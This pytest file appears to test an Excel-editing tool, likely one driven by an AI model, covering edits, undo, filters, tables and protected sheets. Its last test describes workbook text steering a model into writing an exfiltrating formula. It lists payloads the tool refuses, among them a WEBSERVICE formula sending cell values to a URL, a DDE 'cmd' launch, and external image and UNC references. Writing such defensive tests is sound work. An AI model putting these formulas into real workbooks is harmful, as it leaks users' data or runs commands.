    out = _apply(path, [{"op": "pivot", "source": "Data!A1:E6", "rows": ["Region"], "values": ["Qty"], "dest_sheet": "History"}], tmp_path)
    assert not out["ok"] and [s.Name for s in wb.Worksheets] == ["Data", "Notes"], out


def test_the_selection_read_is_the_named_workbooks_own(excel, book, tmp_path):
    """look {workbook: A, range: "selection"} while B is in front returned B's
    cells under A's name (and past the check of A's folder)."""
    wb, path = book
    ws = wb.Worksheets("Data")
    wb.Activate()
    ws.Activate()
    ws.Range("B2:C3").Select()
    other = excel.Workbooks.Add()
    try:
        other.Worksheets(1).Name = "Other"
        other.Worksheets(1).Range("A1:B2").Value = "not yours"
        other.SaveAs(str(tmp_path / "Other Book.xlsx"))
        other.Activate()
        other.Worksheets(1).Range("A1:B2").Select()
        out = ask({"op": "look", "workbook": path, "range": "selection"})
        assert out["ok"], out.get("error")
        rng = out["range"]
        assert rng["sheet"] == "Data" and rng["address"] == "B2:C3" and rng["rows"] == [["Pens", 10], ["Paper", 4]]
    finally:
        other.Close(False)


def test_undo_gives_back_the_dropdowns_that_only_some_cells_had(book, tmp_path):
    wb, path = book
    ws = wb.Worksheets("Data")
    ws.Range("B2:B3").Validation.Add(3, 1, 1, "Pens,Paper,Ink")
    out = _apply(path, [{"op": "validation", "sheet": "Data", "range": "B2:B6", "list": ["a", "b"]}], tmp_path)
    assert out["ok"] and ws.Range("B2").Validation.Formula1 == "a,b"
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and not back["left"], back
    assert ws.Range("B2").Validation.Formula1 == "Pens,Paper,Ink" and ws.Range("B3").Validation.Formula1 == "Pens,Paper,Ink"
    with pytest.raises(Exception):
        ws.Range("B5").Validation.Type  # noqa: B018


def test_undoing_a_table_takes_its_look_away_too(book, tmp_path):
    wb, path = book
    ws = wb.Worksheets("Data")
    out = _apply(path, [{"op": "table", "sheet": "Data", "range": "A1:E6"}], tmp_path)
    assert out["ok"], out
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and ws.ListObjects.Count == 0
    assert ws.Range("A1").Interior.ColorIndex == -4142 and ws.Range("A1").Font.Bold is False
    assert ws.Range("A3").Interior.ColorIndex == -4142


def test_a_formula_that_spills_is_written_and_put_back_as_one(book, tmp_path):
    """Written through the older property, =UNIQUE(...) became =@UNIQUE(...)
    (one value), and Undo turned a spilled formula into #VALUE!."""
    wb, path = book
    ws = wb.Worksheets("Data")
    out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "I1", "formula": "=UNIQUE(A2:A6)"}], tmp_path)
    assert out["ok"], out
    assert [ws.Cells(r, 9).Value for r in (1, 2, 3)] == ["East", "West", "North"]
    ws.Range("G1").Formula2 = "=C2:C6*2"
    assert ws.Range("G3").Value == 14
    out = _apply(path, [{"op": "clear", "sheet": "Data", "range": "G1:G5"}], tmp_path)
    assert out["ok"] and ws.Range("G3").Value is None
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and not back["left"], back
    assert ws.Range("G1").Formula2 == "=C2:C6*2" and [ws.Cells(r, 7).Value for r in range(1, 6)] == [20, 8, 14, 4, 2]


def test_an_array_formula_over_several_cells_comes_back_as_one_array(book, tmp_path):
    wb, path = book
    ws = wb.Worksheets("Data")
    ws.Range("G2:G6").FormulaArray = "=C2:C6*D2:D6"
    out = _apply(path, [{"op": "clear", "sheet": "Data", "range": "G2:G6"}], tmp_path)
    assert out["ok"], out
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and not back["left"], back
    assert ws.Range("G2").HasArray is True and ws.Range("G2").CurrentArray.Address == "$G$2:$G$6"
    assert [ws.Cells(r, 7).Value for r in range(2, 7)] == [25, 48, 210, 5, 30]


def test_a_write_excel_silently_drops_is_said(book, tmp_path):
    """A value written to the second cell of a merged pair goes nowhere, and
    the answer still said "Changed"."""
    wb, path = book
    ws = wb.Worksheets("Data")
    ws.Range("G1:H1").Merge()
    out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "H1", "value": 99}], tmp_path)
    assert out["ok"] and out["changed_cells"] == 0
    assert "merged" in out["steps"][0].get("warning", ""), out["steps"]


def test_undoing_a_removed_filter_says_the_filter_is_not_back(book, tmp_path):
    wb, path = book
    ws = wb.Worksheets("Data")
    out = _apply(path, [{"op": "clear_filter", "sheet": "Data"}], tmp_path)
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and not back["left"], "no filter was on: there is nothing to say"
    ws.Range("A1:E6").AutoFilter(1, "East")
    out = _apply(path, [{"op": "clear_filter", "sheet": "Data"}], tmp_path)
    assert out["ok"] and not ws.AutoFilterMode
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert any("filter" in line for line in back["left"]), back


def test_rows_hidden_by_a_filter_are_never_written_across(book, tmp_path):
    """Excel skips the rows a filter hides when a block is written over them:
    Undo of a clear put "Pens" where "Ink" had been."""
    wb, path = book
    ws = wb.Worksheets("Data")
    items = ["Pens", "Paper", "Ink", "Pens", "Ink"]
    ws.Range("A1:E6").AutoFilter(1, "East")
    for step in ({"op": "set", "sheet": "Data", "cell": "B2:B6", "values": [["a"], ["b"], ["c"], ["d"], ["e"]]},
                 {"op": "clear", "sheet": "Data", "range": "B2:B6"},
                 {"op": "sort", "sheet": "Data", "range": "A1:E6", "by": "Qty"}):
        out = _apply(path, [step], tmp_path)
        assert not out["ok"] and out["code"] == "filtered" and "filter" in out["error"], out
    ws.AutoFilterMode = False
    assert [_v(wb, "Data", f"B{r}") for r in range(2, 7)] == items
    out = _apply(path, [{"op": "clear", "sheet": "Data", "range": "B2:B6"}], tmp_path)
    assert out["ok"], out
    ws.Range("A1:E6").AutoFilter(1, "East")  # the user filters afterwards
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert any("filter" in line for line in back.get("left") or [back.get("error", "")]), back
    ws.AutoFilterMode = False
    assert [_v(wb, "Data", f"B{r}") for r in range(2, 7)] == [None] * 5, "nothing was written across the hidden rows"
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and [_v(wb, "Data", f"B{r}") for r in range(2, 7)] == items


def test_a_formula_a_table_fills_down_by_itself_is_listed_and_undone(book, tmp_path):
    wb, path = book
    ws = wb.Worksheets("Data")
    ws.Range("E2:E6").ClearContents()
    ws.ListObjects.Add(1, ws.Range("A1:E6"), None, 1)
    out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "E2", "formula": "=C2*D2"}], tmp_path)
    assert out["ok"] and _f(wb, "Data", "E6") == "=C6*D6", "Excel filled the table's column"
    assert out["changed_cells"] == 5 and {c["cell"] for c in out["changes"]} == {"E2", "E3", "E4", "E5", "E6"}
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and [x[0] for x in _f(wb, "Data", "E2:E6")] == [""] * 5


def test_undo_never_reaches_past_a_deletion_into_rows_that_have_moved(book, tmp_path):
    """[set B6, delete row 2] then Undo wrote B6's old value into what is NOW
    row 6: another client's row."""
    wb, path = book
    ws = wb.Worksheets("Notes")
    ws.Range("A1:B8").Value = (("Client", "Status"), ("A", "open"), ("B", "open"), ("C", "open"), ("D", "open"), ("E", "open"), ("F", "paid"), ("G", "open"))
    out = _apply(path, [{"op": "set", "sheet": "Notes", "cell": "B6", "value": "paid"},
                        {"op": "delete_rows", "sheet": "Notes", "at": 2, "count": 1}], tmp_path, copy_path=str(tmp_path / "c.xlsx"))
    assert out["ok"], out
    after = [list(r) for r in ws.Range("A1:B7").Value]
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert [list(r) for r in ws.Range("A1:B7").Value] == after, "F's row was never part of the change"
    assert any("cannot be put back" in line for line in back["left"]) and any("before" in line for line in back["left"])


def test_undo_never_lands_on_another_workbook_of_the_same_name(excel, tmp_path):
    a_dir, b_dir = tmp_path / "a", tmp_path / "b"
    a_dir.mkdir()
    b_dir.mkdir()
    wb = excel.Workbooks.Add()
    wb.Worksheets(1).Name = "Data"
    wb.Worksheets(1).Range("A1:B5").Value = (("h1", "h2"), ("x", 1), ("y", 2), ("z", 3), ("w", 4))
    wb.SaveAs(str(a_dir / "Same.xlsx"))
    out = _apply(str(a_dir / "Same.xlsx"), [{"op": "insert_rows", "sheet": "Data", "at": 3, "count": 2},
                                           {"op": "clear", "sheet": "Data", "range": "A1"}], tmp_path)
    assert out["ok"], out
    wb.Close(False)
    wb2 = excel.Workbooks.Add()
    try:
        ws2 = wb2.Worksheets(1)
        ws2.Name = "Data"
        ws2.Range("A2:B5").Value = (("x", 1), ("", ""), ("", ""), ("y", 2))
        wb2.SaveAs(str(b_dir / "Same.xlsx"))
        before = [list(r) for r in ws2.Range("A1:B5").Value]
        back = ask({"op": "restore", "undo_path": out["_undo"]})
        assert not back["ok"], back
        assert [list(r) for r in ws2.Range("A1:B5").Value] == before
    finally:
        wb2.Close(False)


def test_a_reading_copy_of_a_csv_keeps_its_own_ending(excel, tmp_path):
    src = tmp_path / "ledger.csv"
    src.write_text("a,b\n1,2\n", encoding="utf-8")
    (tmp_path / "snap").mkdir()
    wb = excel.Workbooks.Open(str(src))
    try:
        out = ask({"op": "snapshot", "workbook": str(src), "dir": str(tmp_path / "snap")})
        assert out["ok"] and Path(out["path"]).name != "ledger.csv.xlsx", out
        assert Path(out["path"]).suffix.lower() == ".csv" and Path(out["path"]).read_bytes().startswith(b"a,b")
    finally:
        wb.Close(False)


def test_undo_leaves_a_format_the_user_changed_afterwards(book, tmp_path):
    wb, path = book
    ws = wb.Worksheets("Data")
    out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "A2:A3", "fill": "FFF2CC", "bold": True}], tmp_path)
    assert out["ok"], out
    ws.Range("A2").Interior.Color = 255  # the user's own colour, after the change
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and any("format" in line and "since" in line for line in back["left"]), back
    assert int(ws.Range("A2").Interior.Color) == 255, "the user's colour stays"
    assert ws.Range("A3").Interior.ColorIndex == -4142 and ws.Range("A2").Font.Bold is False and ws.Range("A3").Font.Bold is False


def test_undo_of_a_recolour_gives_each_cell_its_own_colour_back(book, tmp_path):
    """Over cells of several colours Excel answers "black" for the range's
    colour: Undo of a new fill painted every one of them black."""
    wb, path = book
    ws = wb.Worksheets("Data")
    ws.Range("A2").Interior.Color = 255
    ws.Range("A3").Interior.Color = 65280
    ws.Range("A4").Interior.Color = 16711680  # every cell filled: only the COLOURS differ
    out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "A2:A4", "fill": "FFF2CC"}], tmp_path)
    assert out["ok"], out
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and not back["left"], back
    assert [int(ws.Range(c).Interior.Color) for c in ("A2", "A3", "A4")] == [255, 65280, 16711680]


def test_a_step_excel_refuses_when_it_runs_puts_back_the_steps_before_it(book, tmp_path):
    """Refused by Excel while the batch RUNS (a formula it cannot read is not
    seen by the check), after two steps were already made."""
    wb, path = book
    out = _apply(path, [
        {"op": "set", "sheet": "Data", "cell": "C2", "value": 99},
        {"op": "add_sheet", "name": "Extra"},
        {"op": "set", "sheet": "Data", "cell": "G1", "formula": "=SUM(((("},
    ], tmp_path)
    assert not out["ok"] and out.get("unchanged") and "step 3" in out["error"] and "2 step(s) before it were put back" in out["error"], out
    assert _v(wb, "Data", "C2") == 10 and [s.Name for s in wb.Worksheets] == ["Data", "Notes"]


def test_a_workbook_open_read_only_is_never_changed(excel, book, tmp_path):
    wb, path = book
    copy = tmp_path / "Read Only.xlsx"
    wb.SaveCopyAs(str(copy))
    ro = excel.Workbooks.Open(str(copy), None, True)
    try:
        step = [{"op": "set", "sheet": "Data", "cell": "A2", "value": "changed"}]
        assert ask({"op": "plan", "workbook": str(copy), "ops": step})["code"] == "read_only"
        out = _apply(str(copy), step, tmp_path)
        assert not out["ok"] and out["code"] == "read_only" and ro.Worksheets("Data").Range("A2").Value == "East"
    finally:
        ro.Close(False)


def test_an_account_number_is_written_as_text_and_undo_twice_is_still_true(book, tmp_path):
    wb, path = book
    out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "G2:G3", "values": [["00123"], ["1234567890123456"]]},
                        {"op": "set", "sheet": "Data", "cell": "C2", "value": 99}], tmp_path)
    assert out["ok"] and _v(wb, "Data", "G2") == "00123" and _v(wb, "Data", "G3") == "1234567890123456"
    wb.Worksheets("Data").Range("C3").Value = 5  # one cell of the range is the user's now... (not part of the change)
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and not back["left"] and _v(wb, "Data", "G2") is None and _v(wb, "Data", "C2") == 10
    # Undo pressed again (after "Excel is busy" stopped it half way, say): what
    # is already back is not called "changed again since".
    again = ask({"op": "restore", "undo_path": out["_undo"]})
    assert again["ok"] and not again["left"], again


def test_a_step_refused_on_a_protected_sheet_is_not_called_half_done(book, tmp_path):
    """The first step WAS put back and the second never happened, yet the
    answer said the change "could not all be put back"."""
    wb, path = book
    wb.Worksheets("Notes").Protect()
    for second in ({"op": "set", "sheet": "Notes", "cell": "A1", "value": "x"},
                   {"op": "set", "sheet": "Notes", "cell": "A1", "bold": True}):
        out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "A2", "value": "changed"}, second], tmp_path)
        assert not out["ok"] and out.get("unchanged") and not out.get("partly"), out
        assert "Excel refused" in out["error"] and _v(wb, "Data", "A2") == "East"


def test_a_text_contains_colour_rule_can_be_added(book, tmp_path):
    wb, path = book
    ws = wb.Worksheets("Data")
    out = _apply(path, [{"op": "conditional_format", "sheet": "Data", "range": "B2:B6", "rule": "text_contains", "value": "Pen", "fill": "C6EFCE"}], tmp_path)
    assert out["ok"], out
    assert ws.Range("B2:B6").FormatConditions.Count == 1
    green = 0xC6 + 0xEF * 256 + 0xCE * 65536
    assert ws.Range("B2").DisplayFormat.Interior.Color == green and ws.Range("B3").DisplayFormat.Interior.Color != green
    back = ask({"op": "restore", "undo_path": out["_undo"]})
    assert back["ok"] and ws.Range("B2:B6").FormatConditions.Count == 0


def test_a_step_on_a_sheet_renamed_in_the_same_call_is_still_counted(book):
    """Renaming a sheet first made every later step on it "a new sheet": a
    deletion there was not seen as one, and overwritten cells were not counted."""
    wb, path = book
    out = ask({"op": "plan", "workbook": path, "ops": [{"op": "rename_sheet", "sheet": "Data", "to": "Ledger"},
                                                       {"op": "delete_rows", "sheet": "Ledger", "at": 2, "count": 3}]})
    assert out["ok"] and out["destructive"], out
    out = ask({"op": "plan", "workbook": path, "ops": [{"op": "rename_sheet", "sheet": "Data", "to": "Ledger"},
                                                       {"op": "set", "sheet": "Ledger", "cell": "E2:E6", "value": 0}]})
    assert out["ok"] and out["overwrites"] == 5 and out["formulas_lost"] == 5, out


def test_fixing_one_of_many_errors_is_not_reported_as_a_new_error(book, tmp_path):
    """Only the first 40 error cells of a sheet were read: fix one of fifty
    and the 41st old one was announced as an error the change had made."""
    wb, path = book
    wb.Worksheets("Data").Range("G1:G50").Formula = "=1/0"
    out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "G1", "value": 1}], tmp_path)
    assert out["ok"] and out["new_errors"] == [], out["new_errors"]
    out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "H1", "formula": "=1/0"}], tmp_path)
    assert out["new_errors"] == ["Data!H1"], "a real new error is still said"


def test_a_formula_that_would_send_cells_outside_is_never_written(book, tmp_path):
    """A workbook's own text can tell a model to write =WEBSERVICE(...&A1):
    Excel itself would then send the cell out. (Refused in the check, so
    nothing here reaches any address.)"""
    wb, path = book
    for step in (
        {"op": "set", "sheet": "Data", "cell": "G1", "formula": '=WEBSERVICE("http://127.0.0.1:9/?d="&A2)'},
        {"op": "set", "sheet": "Data", "cell": "G1", "value": "=cmd|' /C calc'!A0"},
        {"op": "set", "sheet": "Data", "cell": "G1", "values": [["x", '=IMAGE("https://example.com/a.png")']]},
        {"op": "name", "name": "Outside", "refers_to": "='\\\\host\\share\\[b.xlsx]S'!A1"},
        {"op": "conditional_format", "sheet": "Data", "range": "A2:A6", "rule": "formula", "formula": '=LEN(WEBSERVICE("http://127.0.0.1:9"))>0'},
    ):
        out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "F1", "value": "first"}, step], tmp_path)
        assert not out["ok"] and out["code"] == "reaches_out" and "type it in Excel" in out["error"], out
    assert _v(wb, "Data", "G1") is None and _v(wb, "Data", "F1") is None and all(n.Name != "Outside" for n in wb.Names)
    out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "G1", "formula": '=HYPERLINK("https://example.com","site")'}], tmp_path)
    assert out["ok"] and _v(wb, "Data", "G1") == "site", "a link the user has to click is an ordinary formula"
